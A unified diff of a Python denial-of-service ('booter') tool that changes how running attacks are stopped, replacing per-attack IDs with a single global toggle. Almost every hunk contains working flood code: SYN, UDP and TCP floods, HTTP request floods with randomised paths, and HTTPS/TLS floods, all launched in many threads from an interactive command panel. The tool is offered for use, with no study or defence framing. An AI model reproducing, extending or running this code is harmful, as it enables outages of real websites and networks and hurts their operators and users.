@@ -11,7 +11,7 @@ warnings.filterwarnings('ignore',category=DeprecationWarning)
 target_load = ''
 port_load = 0
 methods_load = ''
-stop_command = ''
+stop_command = False
 attack_ist_id = []
 
 # * DEF & CLASS
@@ -45,11 +45,11 @@ def generate_url_path_choice(num):
         data += random.choice(letter)
     return data
 
-def SYN_ATTACK(ip,port,booter,id):
+def SYN_ATTACK(ip,port,booter):
     global stop_command
     try:
         for _ in range(booter):
-            if stop_command == id:
+            if stop_command:
              break
             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             s.setblocking(0)
@@ -58,21 +58,21 @@ def SYN_ATTACK(ip,port,booter,id):
     except:
        pass
 
-def RUNNING_SYN(ip,port,time,booter,id):
+def RUNNING_SYN(ip,port,time,booter):
     global stop_command
     for _ in range(time):
-       if stop_command == id:
+       if stop_command:
              break
-       threading.Thread(target=SYN_ATTACK,args=(ip,port,booter,id)).start()
+       threading.Thread(target=SYN_ATTACK,args=(ip,port,booter)).start()
 
-def UDP_ATTACK(ip,port,booter,size,id):
+def UDP_ATTACK(ip,port,booter,size):
     global stop_command
     try:
         s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
         bytes_loader = os.urandom(size)
         bytes_loader2 = bytearray(os.urandom(size))
         for _ in range(booter):
-         if stop_command == id:
+         if stop_command:
           break
          s.sendto(bytes_loader,(ip,port))
          s.sendto(bytes_loader,(ip,port))
@@ -87,18 +87,18 @@ def UDP_ATTACK(ip,port,booter,size,id):
     except:
        pass
 
-def RUNING_UDP_ATTACK(ip,port,time,booter,size,id):
+def RUNING_UDP_ATTACK(ip,port,time,booter,size):
    global stop_command
    for _ in range(time):
-    if stop_command == id:
+    if stop_command:
      break
-    threading.Thread(target=UDP_ATTACK,args=(ip,port,booter,size,id)).start()
-    threading.Thread(target=UDP_ATTACK,args=(ip,port,booter,size,id)).start()
-    threading.Thread(target=UDP_ATTACK,args=(ip,port,booter,size,id)).start()
-    threading.Thread(target=UDP_ATTACK,args=(ip,port,booter,size,id)).start()
-    threading.Thread(target=UDP_ATTACK,args=(ip,port,booter,size,id)).start()
+    threading.Thread(target=UDP_ATTACK,args=(ip,port,booter,size)).start()
+    threading.Thread(target=UDP_ATTACK,args=(ip,port,booter,size)).start()
+    threading.Thread(target=UDP_ATTACK,args=(ip,port,booter,size)).start()
+    threading.Thread(target=UDP_ATTACK,args=(ip,port,booter,size)).start()
+    threading.Thread(target=UDP_ATTACK,args=(ip,port,booter,size)).start()
 
-def DoS_Attack(ip,host,port,type_attack,booter_sent,data_type_loader_packet,id):
+def DoS_Attack(ip,host,port,type_attack,booter_sent,data_type_loader_packet):
     global stop_command
     url_path = ''
     path_get = ['PY_FLOOD','CHOICES_FLOOD']
@@ -139,7 +139,7 @@ def DoS_Attack(ip,host,port,type_attack,booter_sent,data_type_loader_packet,id):
             packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\t\n\n\r\r".encode()
         s.connect((ip,port))
         for _ in range(booter_sent):
-            if stop_command == id:
+            if stop_command:
                break
             s.sendall(packet_data)
             s.send(packet_data)
@@ -150,27 +150,27 @@ def DoS_Attack(ip,host,port,type_attack,booter_sent,data_type_loader_packet,id):
         except:
             pass
 
-def TCP_ATTACK(ip,port,spam_send,booter,size,id):
+def TCP_ATTACK(ip,port,spam_send,booter,size):
     global stop_command
     try:
         s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         s.connect((ip,port))
         s.connect_ex((ip,port))
         for _ in range(booter):
-         if stop_command == id:
+         if stop_command:
             break
          for _ in range(spam_send):
-            if stop_command == id:
-               break
+            if stop_command:
+             break
             s.sendall(os.urandom(size))
             s.send(os.urandom(size))
     except:
        pass
 
-def SSL_PACKET(target,methods,duration_sec_attack_dude,id):
+def SSL_PACKET(target,methods,duration_sec_attack_dude):
     global stop_command
     for _ in range(int(duration_sec_attack_dude)):
-        if stop_command == id:
+        if stop_command:
             break
         try:
             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -188,7 +188,7 @@ def SSL_PACKET(target,methods,duration_sec_attack_dude,id):
             byt = f"{methods} {url_leak} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
             byt2 = f"{methods} /{url_path} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
             for _ in range(500):
-                if stop_command == id:
+                if stop_command:
                  break
                 ssl_socket.write(byt2)
                 ssl_socket.sendall(byt2)
@@ -199,35 +199,37 @@ def SSL_PACKET(target,methods,duration_sec_attack_dude,id):
            pass
 
 status_code = False
-def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet,id):
+def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet):
     global status_code,stop_command
     if status_code == True:
         while time.time() < time_loader:
-            if stop_command == id:
+            if stop_command:
                break
             for _ in range(spam_loader):
-                if stop_command == id:
+                if stop_command:
                  break
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet,id))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                 th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet,id))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                 th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet,id))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                 th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet,id))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                 th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet,id))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                 th.start()
     else:
-        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet,id)).start()
+        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()
 
-def RUNING_HTTP(create_thread,spam_create_thread,ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet,id):
+def RUNING_HTTP(create_thread,spam_create_thread,ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet,):
     global stop_command
     for loader_num in range(create_thread):
-        for _ in range(spam_create_thread):
-            if stop_command == id:
+        if stop_command:
               break
-            threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet,id)).start()
+        for _ in range(spam_create_thread):
+            if stop_command:
+              break
+            threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()
 
 def get_target(url):
     url = url.rstrip()
@@ -239,7 +241,7 @@ def get_target(url):
     target['port'] = parsed_url.port or ("443" if target['scheme'] == "https" else "80")
     return target
 
-def RECREATE_HTTPS(target,booter,METHODS,id):
+def RECREATE_HTTPS(target,booter,METHODS):
     global stop_command
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -257,7 +259,7 @@ def RECREATE_HTTPS(target,booter,METHODS,id):
         byt2 = f"{METHODS} /{url_path} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
         for _ in range(booter):
 
-            if stop_command == id:
+            if stop_command:
               break
 
             ssl_sock.sendall(byt2)
@@ -271,18 +273,20 @@ def RECREATE_HTTPS(target,booter,METHODS,id):
     except:
         pass
 
-def RUNNING_TCP(ip,port,time,spam_send,booter,size,id):
+def RUNNING_TCP(ip,port,time,spam_send,booter,size):
    for _ in range(time):
-    threading.Thread(target=TCP_ATTACK,args=(ip,port,spam_send,booter,size,id)).start()
-    threading.Thread(target=TCP_ATTACK,args=(ip,port,spam_send,booter,size,id)).start()
-    threading.Thread(target=TCP_ATTACK,args=(ip,port,spam_send,booter,size,id)).start()
-    threading.Thread(target=TCP_ATTACK,args=(ip,port,spam_send,booter,size,id)).start()
-    threading.Thread(target=TCP_ATTACK,args=(ip,port,spam_send,booter,size,id)).start()
+    if stop_command:
+        break
+    threading.Thread(target=TCP_ATTACK,args=(ip,port,spam_send,booter,size)).start()
+    threading.Thread(target=TCP_ATTACK,args=(ip,port,spam_send,booter,size)).start()
+    threading.Thread(target=TCP_ATTACK,args=(ip,port,spam_send,booter,size)).start()
+    threading.Thread(target=TCP_ATTACK,args=(ip,port,spam_send,booter,size)).start()
+    threading.Thread(target=TCP_ATTACK,args=(ip,port,spam_send,booter,size)).start()
 
-def tls_test(target, run_time,methods,id):
+def tls_test(target, run_time,methods):
     global stop_command
     for _ in range(int(run_time)):
-        if stop_command == id:
+        if stop_command:
             break
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -312,7 +316,7 @@ def tls_test(target, run_time,methods,id):
             byt = f"{methods} {url_leak} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
             byt2 = f"{methods} /{url_path} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
             for _ in range(500):
-                if stop_command == id:
+                if stop_command:
                     break
                 ssl_sock.sendall(byt2)
                 ssl_sock.send(byt)
@@ -320,21 +324,21 @@ def tls_test(target, run_time,methods,id):
         except:
             pass
 
-def RUNNING_HTTPS_ALL(methods_leak,thread_made,target,time_booter,METHODS,id):
+def RUNNING_HTTPS_ALL(methods_leak,thread_made,target,time_booter,METHODS):
    global stop_command
    for _ in range(int(thread_made)):
-        if stop_command == id:
+        if stop_command:
             break
         if methods_leak == 'RECREATE_HTTPS':
-           threading.Thread(target=RECREATE_HTTPS, args=(target, time_booter,METHODS,id)).start()
+           threading.Thread(target=RECREATE_HTTPS, args=(target, time_booter,METHODS)).start()
         elif methods_leak == 'SSL_PACKET':
-           threading.Thread(target=SSL_PACKET,args=(target,METHODS,time_booter,id)).start()
+           threading.Thread(target=SSL_PACKET,args=(target,METHODS,time_booter)).start()
         elif methods_leak == 'TLS_TEST':
-           threading.Thread(target=tls_test, args=(target, time_booter,METHODS,id)).start()
+           threading.Thread(target=tls_test, args=(target, time_booter,METHODS)).start()
         else:
-           threading.Thread(target=RECREATE_HTTPS, args=(target, time_booter,METHODS,id)).start()
-           threading.Thread(target=SSL_PACKET,args=(target,METHODS,time_booter,id)).start()
-           threading.Thread(target=tls_test, args=(target, time_booter,METHODS,id)).start()
+           threading.Thread(target=RECREATE_HTTPS, args=(target, time_booter,METHODS)).start()
+           threading.Thread(target=SSL_PACKET,args=(target,METHODS,time_booter)).start()
+           threading.Thread(target=tls_test, args=(target, time_booter,METHODS)).start()
 
 def CLI_COLOR(mode):
     global target_load,port_load,methods_load
@@ -358,7 +362,7 @@ def CLI_COLOR(mode):
 
 num_panel = False
 def PANEL_USE():
-    global num_panel,target_load,port_load,methods_load,status_code,attack_ist_id,stop_command
+    global num_panel,target_load,port_load,methods_load,status_code,stop_command
     if num_panel == False:
       CLI_COLOR('main_banner')
       num_panel = True
@@ -409,9 +413,7 @@ def PANEL_USE():
                 code_leak = False
                 print(f"{Fore.YELLOW}FAILED TO GET URL . . .{Fore.RESET}")
             if code_leak == True:
-             id = (f'{arg_load[0]}_{len(arg_load)}_{GET_TIME()}')
-             attack_ist_id.append(id)
-             threading.Thread(target=RUNING_HTTP,args=(create_thread,spam_create_thread,ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet,id)).start()
+             threading.Thread(target=RUNING_HTTP,args=(create_thread,spam_create_thread,ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()
             status_code = True
             target_load = ip
             port_load = port_loader
@@ -429,9 +431,7 @@ def PANEL_USE():
           time_booter = int(arg_load[3])
           mode_tls = str(arg_load[4])
           target = get_target(url)
-          id = (f'{arg_load[0]}_{len(arg_load)}_{GET_TIME()}')
-          attack_ist_id.append(id)
-          threading.Thread(target=RUNNING_HTTPS_ALL,args=('TLS_TEST',thread_loader,target,time_booter,mode_tls,id)).start()
+          threading.Thread(target=RUNNING_HTTPS_ALL,args=('TLS_TEST',thread_loader,target,time_booter,mode_tls)).start()
           target_load = target['host']
           port_load = target['port']
           methods_load = 'HTTPS_TLS.MIX'
@@ -446,9 +446,7 @@ def PANEL_USE():
           time_booter = int(arg_load[3])
           mode_tls = str(arg_load[4])
           target = get_target(url)
-          id = (f'{arg_load[0]}_{len(arg_load)}_{GET_TIME()}')
-          attack_ist_id.append(id)
-          threading.Thread(target=RUNNING_HTTPS_ALL,args=('HTTP_ALL',thread_loader,target,time_booter,mode_tls,id)).start()
+          threading.Thread(target=RUNNING_HTTPS_ALL,args=('HTTP_ALL',thread_loader,target,time_booter,mode_tls)).start()
           target_load = target['host']
           port_load = target['port']
           methods_load = 'HTTPS_ALL'
@@ -463,9 +461,7 @@ def PANEL_USE():
           time_booter = int(arg_load[3])
           mode_tls = str(arg_load[4])
           target = get_target(url)
-          id = (f'{arg_load[0]}_{len(arg_load)}_{GET_TIME()}')
-          attack_ist_id.append(id)
-          threading.Thread(target=RUNNING_HTTPS_ALL,args=('SSL_LOAD',thread_loader,target,time_booter,mode_tls,id)).start()
+          threading.Thread(target=RUNNING_HTTPS_ALL,args=('SSL_LOAD',thread_loader,target,time_booter,mode_tls)).start()
           target_load = target['host']
           port_load = target['port']
           methods_load = 'HTTPS_TLS.CIPHER'
@@ -480,9 +476,7 @@ def PANEL_USE():
             time_booter = int(arg_load[3])
             mode_tls = str(arg_load[4])
             target = get_target(url)
-            id = (f'{arg_load[0]}_{len(arg_load)}_{GET_TIME()}')
-            attack_ist_id.append(id)
-            threading.Thread(target=RUNNING_HTTPS_ALL,args=('RECREATE_HTTPS',thread_loader,target,time_booter,mode_tls,id)).start()
+            threading.Thread(target=RUNNING_HTTPS_ALL,args=('RECREATE_HTTPS',thread_loader,target,time_booter,mode_tls)).start()
             target_load = target['host']
             port_load = target['port']
             methods_load = 'HTTPS_RECREATE'
@@ -498,9 +492,7 @@ def PANEL_USE():
            spam_send = int(arg_load[4])
            booter = int(arg_load[5])
            size = int(arg_load[6])
-           id = (f'{arg_load[0]}_{len(arg_load)}_{GET_TIME()}')
-           attack_ist_id.append(id)
-           threading.Thread(target=RUNNING_TCP,args=(ip,port,time_secs,spam_send,booter,size,id)).start()
+           threading.Thread(target=RUNNING_TCP,args=(ip,port,time_secs,spam_send,booter,size)).start()
            target_load = ip
            port_load = port
            methods_load = 'TCP'
@@ -516,10 +508,8 @@ def PANEL_USE():
            booter = int(arg_load[5])
            size_tcp = int(arg_load[6])
            size_udp = int(arg_load[7])
-           id = (f'{arg_load[0]}_{len(arg_load)}_{GET_TIME()}')
-           attack_ist_id.append(id)
-           threading.Thread(target=RUNNING_TCP,args=(ip,port,time_secs,spam_send,booter,size_tcp,id)).start()
-           threading.Thread(target=RUNING_UDP_ATTACK,args=(ip,port,time_secs,booter,size_udp,id)).start()
+           threading.Thread(target=RUNNING_TCP,args=(ip,port,time_secs,spam_send,booter,size_tcp)).start()
+           threading.Thread(target=RUNING_UDP_ATTACK,args=(ip,port,time_secs,booter,size_udp)).start()
            target_load = ip
            port_load = port
            methods_load = 'TUP'
@@ -532,9 +522,7 @@ def PANEL_USE():
           port = int(arg_load[2])
           time_null = int(arg_load[3])
           booter = int(arg_load[4])
-          id = (f'{arg_load[0]}_{len(arg_load)}_{GET_TIME()}')
-          attack_ist_id.append(id)
-          threading.Thread(target=RUNNING_SYN,args=(ip,port,time_null,booter,id)).start()
+          threading.Thread(target=RUNNING_SYN,args=(ip,port,time_null,booter)).start()
           target_load = ip
           port_load = port
           methods_load = 'SYN'
@@ -548,9 +536,7 @@ def PANEL_USE():
           time_null = int(arg_load[3])
           booter = int(arg_load[4])
           size = int(arg_load[5])
-          id = (f'{arg_load[0]}_{len(arg_load)}_{GET_TIME()}')
-          attack_ist_id.append(id)
-          threading.Thread(target=RUNING_UDP_ATTACK,args=(ip,port,time_null,booter,size,id)).start()
+          threading.Thread(target=RUNING_UDP_ATTACK,args=(ip,port,time_null,booter,size)).start()
           target_load = ip
           port_load = port
           methods_load = 'UDP'
@@ -591,22 +577,12 @@ def PANEL_USE():
           except BaseException as e:
            print(F"[BASE - ERROR] {e}")
     elif arg_load[0] == 'STOP':
-       if len(attack_ist_id) == 0:
-          print(f"{fg(196)}NOT FOUND ID{attr(0)}")
-       else:
-          for data_id in attack_ist_id:
-             print(f'{fg(196)}ID{fg(231)}={fg(197)}{data_id}{attr(0)}')
-          print(f"{fg(76)}TYPE {fg(77)}YOU {fg(78)}ID {fg(79)}NEED {fg(80)}KILL{attr(0)}")
-          id_killer = input(f"{fg(196)}I{fg(197)}D {fg(231)}${attr(0)}")
-          stop_command = id_killer
-          for _ in attack_ist_id:
-             try:
-              attack_ist_id.remove(id_killer)
-             except Exception as e:
-                print(f"{Fore.RED}I CAN'T REMOVE PLS SEND THIS ERROR TO DEV HEX1629 ( 'EXCEPTION {e}' ){Fore.RESET}")
-             except BaseException as e:
-                print(f"{Fore.RED}I CAN'T REMOVE PLS SEND THIS ERROR TO DEV HEX1629 ( 'BASE-EXCEPTION {e}' ){Fore.RESET}")
+       if stop_command == True:
+          print(f'{fg(40)}STOP {fg(41)}ATTACK {fg(42)}IT {fg(43)}FALSE{attr(0)}')
           stop_command = False
+       else:
+          print(f'{fg(202)}STOP {fg(203)}ATTACK {fg(204)}IT {fg(205)}TRUE{attr(0)}')
+          stop_command = True
     elif arg_load[0] == 'PING':
        methods_type = input(f"{Fore.GREEN}MODE_PING {Fore.WHITE}({Fore.YELLOW}l4{Fore.WHITE},{Fore.LIGHTYELLOW_EX}l7{Fore.WHITE}) ${Fore.RESET}")
        if methods_type.upper() == 'L7' or methods_type.upper() == 'LAYER7' or methods_type.upper() == '7':
